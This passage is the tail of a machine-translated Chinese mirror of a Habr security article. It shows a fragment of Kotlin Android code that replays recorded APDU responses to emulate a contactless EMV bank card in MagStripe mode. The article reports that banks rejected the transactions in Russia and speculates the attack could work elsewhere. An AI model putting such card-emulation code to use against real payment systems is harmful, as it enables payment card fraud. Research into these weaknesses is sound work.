Toast.LENGTH_SHORT).show() } } return list } private var commands: List&lt;Command&gt;? = arrayListOf() override fun processCommandApdu(apdu: ByteArray?, bundle: Bundle?): ByteArray { commands = getData(applicationContext) commands?.forEachIndexed { i, command -&gt; if (apdu.toHex() == command.getHexString()) { return commands!![i+1].split() } } Log.e("LOG", "Finnish") return Value.magStripModeEmulated.hexToByteArray() }</code> </pre> <br> 该应用程序的几个屏幕截图。 我们读取了卡和parsim日志： <br><br><img src="https://habrastorage.org/webt/0p/qt/vj/0pqtvjicqlg6hh4iorgruoljd_w.png"><br><br> 因此，您可以使用卡数据模拟手机上非接触式EMV卡的操作。 但是幸运的是，对某人来说，这种攻击在俄罗斯不起作用。 根据我们的实验，交易一直到发行人的银行，并被银行本身拒绝。 此外，我们无法使用MagStripe进行离线交易。 但是，这种攻击可能会在其他使用MagStripe模式非常普遍且风险管理算法略有不同的国家/地区实施，例如在美国。 <br><br><h4> 借助本文链接 </h4><br> 银行微处理器卡/ I.M. Goldovsky-M。：TsIPSiR：Alpina Pub Lakers，2010。-686羽 <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">EMV项目：分步</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">奥地利研究人员的研究</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">链接到应用程序代码</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">终端模拟器。</a> <br><br> 感谢<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" class="user_link">barracud4</a>帮助<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" class="user_link">我</a>准备本文。 </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN421543/">https://habr.com/ru/post/zh-CN421543/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN421529/index.html">Netflix，Uber，Google和您参加MBLT DEV 2018</a></li>
<li><a href="../zh-CN421531/index.html">如何使用Globus网络的示例在后端自动生成模板，从而将ReactJS集成到1C-Bitrix中</a></li>
<li><a href="../zh-CN421533/index.html">选择一种编程语言：Apple程序员的3个技巧</a></li>
<li><a href="../zh-CN421535/index.html">冒险-电子产品。 在IT世界中飞速发展</a></li>
<li><a href="../zh-CN421537/index.html">JS：年轻战士课程中的高阶函数</a></li>
<li><a href="../zh-CN421545/index.html">PocketBook 616的评论-具有背光功能的最经济实惠的2018袖珍本</a></li>
<li><a href="../zh-CN421547/index.html">独立数据中心验收</a></li>
<li><a href="../zh-CN421549/index.html">我们正在编写技术文档：外行指南</a></li>
<li><a href="../zh-CN421551/index.html">精通Vuex-从零到英雄</a></li>
<li><a href="../zh-CN421553/index.html">我们共享技术内容：我们在一个站点上收集了所有材料</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>